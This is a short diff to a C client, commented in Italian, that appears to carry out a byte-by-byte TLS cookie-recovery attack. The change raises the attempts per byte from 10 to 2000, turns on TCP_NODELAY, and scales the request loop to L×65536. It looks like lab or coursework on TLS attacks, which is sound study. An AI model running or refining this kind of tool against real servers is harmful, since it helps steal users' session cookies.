@@ -7,8 +7,9 @@
 #include <stdbool.h>
 #include <sys/socket.h>
 #include <unistd.h>
+#include <netinet/tcp.h>
 
-#define L 10  //numero di tentativi per ogni byte
+#define L 2000  //numero di tentativi per ogni byte
 
 SSL_CTX *setup_ssl_context();
 int initialize_connection(const char *server_ip, int port);
@@ -87,6 +88,8 @@ int initialize_connection(const char *server_ip, int port){
   struct sockaddr_in server_addr;
 
   int sockfd = socket(AF_INET, SOCK_STREAM, 0);
+  int flag = 1;
+  setsockopt(sockfd, IPPROTO_TCP, TCP_NODELAY, (char *) &flag, sizeof(int));
 
   memset(&server_addr, 0, sizeof(server_addr));
   server_addr.sin_family = AF_INET;
@@ -154,7 +157,7 @@ void sendRequests(const char *server_ip, int port, SSL_CTX *ctx) {
 
   //numero totale di richieste 671232
   //dopo L richieste si esegue lo shift del cookie
-  while (i < 655360) {
+  while (i < L*(256*256)) {
     printf("Richiesta numero: %d \n", i + 1);
     do_single_request(server_ip, port, ctx);
     i++;
